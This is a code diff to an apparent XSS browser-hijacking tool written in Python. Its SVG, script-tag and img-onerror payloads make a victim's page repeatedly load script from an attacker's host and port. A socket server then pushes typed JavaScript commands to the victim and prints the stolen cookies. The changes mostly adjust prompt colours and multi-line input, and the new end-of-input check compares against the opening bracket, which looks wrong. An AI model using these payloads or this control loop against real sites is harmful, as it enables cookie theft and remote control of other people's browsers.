@@ -51,10 +51,10 @@ gene = args.gene
 cmd = format(args.command)
 secs = int(format(args.secs))
 payload = '''
- - SVG: %s<svg/onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//%s:%s"},1010)>
-%s - SCRIPT: %s<script>setInterval(function(){with(document)body.appendChild(createElement("script")).src="//%s:%s"},1010)</script>
-%s - IMG: %s<img src=x onerror=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//%s:%s"},1010)>
-''' % (blue, host, port, white, blue, host, port, white, blue, host, port)
+ - SVG: <svg/onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//%s:%s"},1010)>
+ - SCRIPT: <script>setInterval(function(){with(document)body.appendChild(createElement("script")).src="//%s:%s"},1010)</script>
+ - IMG: <img src=x onerror=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//%s:%s"},1010)>
+''' % (host, port, host, port, host, port)
 
         
 form = b'''HTTP/1.1 200 OK
@@ -71,16 +71,17 @@ def shell():
         
         if secs != 0:
             s.settimeout(secs)
-        buffer = input('%s>>> ' % (red, white))
+        buffer = input('%s>>>%s ' % (blue, white))
         if buffer == 'exit' or buffer == 'quit':
             break
         try:
-            if buffer[-1] == '{':
+            if buffer[-1] in ['{', '(', '[']:
+                openchar = buffer[-1]
                 while 1:
-                    func = input('>' + ' '*9)
+                    func = input(' ' * 10)
                     buffer += '\n' + func
                     try:
-                        if func[-1] == '}':
+                        if func[-1] == openchar:
                             break
                     except:
                         pass
@@ -109,7 +110,7 @@ def shell():
                 try:
                     print(cookie)
                 except:
-                    print('Could not get the cookie because there is no cookie or because of some other reasons')
+                    print('Could not get the cookie because there is no cookie or other reasons')
                               
             c.send(form + buffer.encode())
             c.shutdown(socket.SHUT_RDWR)
@@ -165,7 +166,7 @@ def main():
                 cookie = line.lower().replace('cookie: ', '')
         if len(cmd):
             c.send(form + cmd.encode())
-            print('%s>>>%s %s' % (red, white, cmd))
+            print('%s>>>%s %s' % (blue, white, cmd))
             
         c.shutdown(socket.SHUT_RDWR)
         c.close()
